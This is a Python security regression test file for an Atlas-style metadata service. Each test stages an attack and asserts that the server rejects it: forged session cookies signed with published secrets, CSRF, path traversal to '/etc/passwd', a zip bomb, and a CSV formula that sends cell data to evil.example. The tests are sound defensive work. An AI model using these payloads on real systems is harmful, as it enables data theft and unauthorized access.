"""Security regression tests: each test is an attack that must fail."""
import base64
import hashlib
import io
import json
import os
import tempfile
import time
import zipfile
from pathlib import Path

from itsdangerous import TimestampSigner

from pyatlas.auth import hash_password
from tests.conftest import _fresh_client
from tests.helpers import create_sales_model

V2 = "/api/atlas/v2"
A = "/api/atlas/admin"
BROWSER = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/140.0"}


def _users(tmp_path, lines):
    p = tmp_path / "users.properties"
    p.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return p


def _sha(s):
    return hashlib.sha256(s.encode()).hexdigest()


def _login(c, user, pw):
    return c.post("/j_spring_security_check", data={"j_username": user, "j_password": pw}, headers=BROWSER)


# ------------------------------------------------------------------ sessions
def test_forged_session_cookie_with_published_secret_is_rejected():
    for secret in (None, "change-me-please-change-me-please", "please-change-this-secret-value"):
        c = _fresh_client(session_secret=secret)
        try:
            c.auth = None
            payload = base64.b64encode(json.dumps({"user": "admin"}).encode())
            for key in ("change-me-please-change-me-please", "please-change-this-secret-value"):
                cookie = TimestampSigner(key).sign(payload).decode()
                c.cookies.set("ATLASSESSIONID", cookie)
                r = c.get(f"{A}/session")
                assert r.status_code == 401, (secret, key)
        finally:
            c.__exit__(None, None, None)


def test_session_is_revalidated_and_expires(tmp_path):
    users = _users(tmp_path, [f"admin=ADMIN::{_sha('admin')}", f"bob=DATA_STEWARD::{_sha('bob')}"])
    c = _fresh_client(users_file=users, session_max_age_secs=2)
    try:
        c.auth = None
        assert _login(c, "bob", "bob").status_code == 200
        s = c.get(f"{A}/session", headers=BROWSER).json()
        assert s["userName"] == "bob" and s["groups"] == ["DATA_STEWARD"] and len(s["_csrfToken"]) > 20
        # groups come from the users file, not from the cookie
        users.write_text(f"admin=ADMIN::{_sha('admin')}\nbob=DATA_SCIENTIST::{_sha('bob')}\n", encoding="utf-8")
        os.utime(users, (time.time() + 5, time.time() + 5))
        assert c.get(f"{A}/session", headers=BROWSER).json()["groups"] == ["DATA_SCIENTIST"]
        # a removed user loses access immediately
        users.write_text(f"admin=ADMIN::{_sha('admin')}\n", encoding="utf-8")
        os.utime(users, (time.time() + 10, time.time() + 10))
        assert c.get(f"{A}/session", headers=BROWSER).status_code == 401
        # sessions expire (max age 2s)
        users.write_text(f"admin=ADMIN::{_sha('admin')}\nbob=DATA_STEWARD::{_sha('bob')}\n", encoding="utf-8")
        os.utime(users, (time.time() + 15, time.time() + 15))
        assert _login(c, "bob", "bob").status_code == 200
        assert c.get(f"{A}/session", headers=BROWSER).status_code == 200
        time.sleep(3.2)
        assert c.get(f"{A}/session", headers=BROWSER).status_code == 401
    finally:
        c.__exit__(None, None, None)


def test_password_hash_formats_and_login_throttle(tmp_path):
    users = _users(tmp_path, [f"admin=ADMIN::{_sha('admin')}",
                              f"carol=ADMIN::{hash_password('s3cret!')}",            # BCrypt (Atlas default)
                              f"dave=ADMIN::{_sha('pw' + '{dave}')}"])                 # SHA-256 salted with user
    c = _fresh_client(users_file=users, login_max_failures=3, login_lockout_secs=60)
    try:
        for u, p in (("carol", "s3cret!"), ("dave", "pw")):
            c.auth = (u, p)
            assert c.get(f"{A}/session").status_code == 200, u
        c.auth = ("carol", "wrong")
        for _ in range(3):
            assert c.get(f"{A}/session").status_code == 401
        c.auth = ("carol", "s3cret!")            # locked now, even with the right password
        r = c.get(f"{A}/session")
        assert r.status_code == 401 and "Too many" in r.json()["errorMessage"]
        c.auth = ("dave", "pw")                   # other users are not affected
        assert c.get(f"{A}/session").status_code == 200
    finally:
        c.__exit__(None, None, None)


# ------------------------------------------------------------------ CSRF
def test_csrf_protection_for_browsers(tmp_path):
    c = _fresh_client()
    try:
        c.auth = None
        assert _login(c, "admin", "admin").status_code == 200
        body = {"classificationDefs": [{"name": "C1"}]}
        # a forged cross-site request from the browser carries the cookie but not the header
        r = c.post(f"{V2}/types/typedefs", json=body, headers=BROWSER)
        assert r.status_code == 400 and "CSRF" in r.json()["msgDesc"]
        r = c.post(f"{V2}/types/typedefs", json=body, headers={**BROWSER, "X-XSRF-HEADER": "guess"})
        assert r.status_code == 400
        # text/plain "simple request" trick
        r = c.post(f"{V2}/types/typedefs", content=json.dumps(body), headers={**BROWSER, "Content-Type": "text/plain"})
        assert r.status_code == 400
        # the UI flow: token from /admin/session
        tok = c.get(f"{A}/session", headers=BROWSER).json()["_csrfToken"]
        r = c.post(f"{V2}/types/typedefs", json=body, headers={**BROWSER, "X-XSRF-HEADER": tok})
        assert r.status_code == 200, r.text
        # reads are not affected
        assert c.get(f"{V2}/types/typedef/name/C1", headers=BROWSER).status_code == 200
        # browser with cached Basic credentials and no session: rejected as well
        c.cookies.clear()
        c.auth = ("admin", "admin")
        assert c.post(f"{V2}/types/typedefs", json={"classificationDefs": [{"name": "C2"}]},
                      headers=BROWSER).status_code == 400
        # non-browser API clients (curl, python) work as before
        assert c.post(f"{V2}/types/typedefs", json={"classificationDefs": [{"name": "C2"}]},
                      headers={"User-Agent": "python-requests/2.32"}).status_code == 200
    finally:
        c.__exit__(None, None, None)


# ------------------------------------------------------------------ access control
def test_saved_searches_are_private(tmp_path):
    users = _users(tmp_path, [f"admin=ADMIN::{_sha('admin')}", f"eve=DATA_SCIENTIST::{_sha('eve')}"])
    c = _fresh_client(users_file=users)
    try:
        c.auth = ("admin", "admin")
        mine = c.post(f"{V2}/search/saved", json={"name": "mine", "searchParameters": {"typeName": "hive_table"}}).json()
        assert mine["ownerName"] == "admin"
        c.auth = ("eve", "eve")
        assert c.post(f"{V2}/search/saved", json={"name": "x", "ownerName": "admin",
                                                  "searchParameters": {}}).status_code == 400
        assert c.get(f"{V2}/search/saved", params={"user": "admin"}).status_code == 400
        assert c.get(f"{V2}/search/saved/mine", params={"user": "admin"}).status_code == 400
        assert c.get(f"{V2}/search/saved/execute/guid/{mine['guid']}").status_code == 400
        assert c.get(f"{V2}/search/saved/execute/mine", params={"user": "admin"}).status_code == 400
        assert c.put(f"{V2}/search/saved", json={"guid": mine["guid"], "name": "stolen"}).status_code == 400
        assert c.delete(f"{V2}/search/saved/{mine['guid']}").status_code == 400
        assert c.get(f"{V2}/search/saved").json() == []
        c.auth = ("admin", "admin")
        assert [s["name"] for s in c.get(f"{V2}/search/saved").json()] == ["mine"]
        assert c.get(f"{V2}/search/saved/execute/guid/{mine['guid']}").status_code == 200
    finally:
        c.__exit__(None, None, None)


def test_importfile_only_reads_the_import_directory(tmp_path):
    imp = tmp_path / "import"
    imp.mkdir()
    c = _fresh_client(import_dir=imp)
    try:
        create_sales_model(c)
        data = c.post(f"{A}/export", json={"itemsToExport": [{"typeName": "hive_db", "uniqueAttributes": {
            "qualifiedName": "sales@cl1"}}]}).content
        (imp / "ok.zip").write_bytes(data)
        outside = tmp_path / "outside.zip"
        outside.write_bytes(data)
        for name in (str(outside), "../outside.zip", "/etc/passwd", str(imp / ".." / "outside.zip")):
            r = c.post(f"{A}/importfile", json={"options": {"fileName": name}})
            assert r.status_code == 400, name
            assert "passwd" not in r.text or "import directory" in r.text
        assert c.post(f"{A}/importfile", json={"options": {"fileName": "ok.zip"}}).json()["operationStatus"] == "SUCCESS"
    finally:
        c.__exit__(None, None, None)


def test_download_file_names_cannot_escape(client):
    for name in ("..%2F..%2Fetc%2Fpasswd", "..", "a%2F..%2F..%2Fx", "%2Fetc%2Fpasswd"):
        r = client.get(f"{V2}/search/download/{name}")
        assert r.status_code in (400, 404), name


# ------------------------------------------------------------------ resource limits / file content
def test_request_size_and_zip_bomb_limits():
    c = _fresh_client(max_upload_mb=1, max_import_uncompressed_mb=10)
    try:
        r = c.post(f"{A}/import", files={"data": ("big.zip", b"0" * (2 * 1024 * 1024), "application/zip")})
        assert r.status_code == 413
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("atlas-export-order.json", "[]")
            z.writestr("bomb.json", b"\0" * (20 * 1024 * 1024))          # compresses to ~20 KB
        assert len(buf.getvalue()) < 1024 * 1024
        r = c.post(f"{A}/import", files={"data": ("bomb.zip", buf.getvalue(), "application/zip")})
        assert r.status_code == 400 and "exceeds the limit" in r.json()["errorMessage"]
    finally:
        c.__exit__(None, None, None)


def test_csv_formula_injection_is_neutralized(client):
    create_sales_model(client)
    evil = '=HYPERLINK("http://evil.example/?"&A1,"click")'
    t = client.post(f"{V2}/search/basic", json={"typeName": "hive_table", "query": "customers"}).json()["entities"][0]
    client.put(f"{V2}/entity/guid/{t['guid']}", params={"name": "owner"}, json=evil)
    client.post(f"{V2}/search/basic/download/create_file", json={
        "searchParameters": {"typeName": "hive_table"}, "attributeLabelMap": {}})
    for _ in range(100):
        recs = client.get(f"{V2}/search/download/status").json()["searchDownloadRecords"]
        if recs and recs[0]["status"] == "COMPLETE":
            break
        time.sleep(0.05)
    text = client.get(f"{V2}/search/download/{recs[0]['fileName']}").text
    assert "'=HYPERLINK" in text and ',"=HYPERLINK' not in text


def test_security_headers_and_no_error_details(client):
    r = client.get(f"{A}/session")
    assert r.headers["x-frame-options"] == "DENY"
    assert r.headers["x-content-type-options"] == "nosniff"
    assert "default-src 'self'" in r.headers["content-security-policy"]
    svc = client.app.state.services

    async def boom(*a, **k):
        raise RuntimeError("secret internal detail /etc/pyatlas")
    orig = svc.search.basic
    svc.search.basic = boom
    from fastapi.testclient import TestClient
    raw = TestClient(client.app, raise_server_exceptions=False)
    try:
        r = raw.post(f"{V2}/search/basic", json={"typeName": "hive_table"}, auth=("admin", "admin"))
    finally:
        svc.search.basic = orig
    assert r.status_code == 500 and "secret" not in r.text and "id " in r.json()["errorMessage"]
